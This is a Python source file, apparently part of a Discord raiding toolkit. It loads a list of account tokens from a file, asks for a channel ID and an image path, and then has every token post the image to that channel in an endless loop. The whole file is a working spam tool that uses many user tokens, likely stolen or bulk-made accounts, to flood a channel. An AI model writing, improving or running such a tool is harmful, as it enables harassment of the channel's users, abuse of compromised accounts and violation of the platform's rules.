from assets import *

r = '\033[90m'
c = Fore.RED
g = Fore.LIGHTBLACK_EX
s = Fore.BLACK
x = Fore.GREEN
k = Fore.YELLOW

banner = f"""
                 
                                \033[31m _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
"""

timestamp = datetime.datetime.now().strftime(f'{c}[{g}%H:%M:%S{c}]{c}')

async def send_image(session, token, channel_id, image_path):
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    headers = {
        'Authorization': token,
    }

    form_data = aiohttp.FormData()
    form_data.add_field('file', open(image_path, 'rb'), filename=os.path.basename(image_path))

    async with session.post(url, headers=headers, data=form_data) as response:
        if response.status == 200:
            print(f"                                {timestamp} {c}{c}[{c}{r}#{r}{c}]{c}{x} Image Sent Successfully")
        else:
            print(f"                                {timestamp} {c}{c}[{c}{r}#{r}{c}]{c}{c} Failed To Send Image")

async def image_spammer():
    tokens_file = 'assets/input/tokens.txt'
    with open(tokens_file, 'r') as file:
        tokens = file.read().splitlines()

    channel_id = int(input(f"                                {timestamp} {c}[{c}{r}?{r}{c}]{c} {c}[Channel ID] {c}> {c}"))
    image_path = input(f"                                {timestamp} {c}[{c}{r}?{r}{c}]{c} {c}[Image Path]{c} {c}> {c}")
    os.system('cls'); print (banner)

    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_image(session, token, channel_id, image_path) for token in tokens]
            await asyncio.gather(*tasks)
